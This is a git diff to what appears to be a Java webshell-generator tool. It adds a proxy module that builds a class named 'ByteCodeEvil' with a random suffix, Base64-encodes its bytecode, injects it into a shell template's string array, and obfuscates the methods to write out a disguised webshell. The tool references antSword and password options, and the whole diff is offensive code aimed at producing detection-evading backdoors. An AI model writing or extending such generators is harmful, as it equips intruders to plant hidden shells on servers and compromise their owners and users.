@@ -6,10 +6,13 @@ import com.github.javaparser.ast.CompilationUnit;
 import com.github.javaparser.ast.body.ClassOrInterfaceDeclaration;
 import com.github.javaparser.ast.body.ConstructorDeclaration;
 import com.github.javaparser.ast.body.MethodDeclaration;
+import com.github.javaparser.ast.body.VariableDeclarator;
 import com.github.javaparser.ast.expr.ArrayInitializerExpr;
 import com.github.javaparser.ast.expr.StringLiteralExpr;
 import com.github.javaparser.ast.type.ClassOrInterfaceType;
 import org.sec.Main;
+import org.sec.core.ByteCodeEvil;
+import org.sec.core.ByteCodeEvilDump;
 import org.sec.input.Command;
 import org.sec.input.Logo;
 import org.sec.module.IdentifyModule;
@@ -22,6 +25,9 @@ import org.sec.util.WriteUtil;
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
 import java.util.List;
 
 public class Application {
@@ -35,7 +41,7 @@ public class Application {
             if (command.help) {
                 jc.usage();
             }
-            if (command.javascript) {
+            if (command.jsModule) {
                 doJavaScript(command);
                 return;
             }
@@ -45,6 +51,10 @@ public class Application {
             }
             if (command.exprModule) {
                 doExpr(command);
+                return;
+            }
+            if (command.proxyModule) {
+                doProxy(command);
                 return;
             }
             if (command.antSword) {
@@ -66,6 +76,36 @@ public class Application {
         normalOperate(newMethod);
         decCodeOperate(decMethod);
         WriteUtil.write(newMethod, decMethod, command.password, command.unicode);
+        System.out.println("Finish!");
+    }
+
+    private static void doProxy(Command command) throws IOException {
+        MethodDeclaration proxyMethod = getMethod("Proxy.java");
+        MethodDeclaration decMethod = getMethod("Dec.java");
+        if (proxyMethod == null || decMethod == null) {
+            return;
+        }
+
+        String newName = "org/sec/ByteCodeEvil" + RandomUtil.getRandomString(10);
+        byte[] resultByte = ByteCodeEvilDump.dump(newName);
+        if (resultByte == null || resultByte.length == 0) {
+            return;
+        }
+        String byteCode = Base64.getEncoder().encodeToString(resultByte);
+
+        List<VariableDeclarator> vds = proxyMethod.findAll(VariableDeclarator.class);
+        for (VariableDeclarator vd : vds) {
+            if (vd.getNameAsString().equals("globalArr")) {
+                List<StringLiteralExpr> sles = vd.findAll(StringLiteralExpr.class);
+                sles.get(1).setValue(byteCode);
+                sles.get(2).setValue(newName);
+            }
+        }
+
+        normalOperate(proxyMethod);
+        decCodeOperate(decMethod);
+
+        WriteUtil.write(proxyMethod, decMethod, command.password, command.unicode);
         System.out.println("Finish!");
     }
 
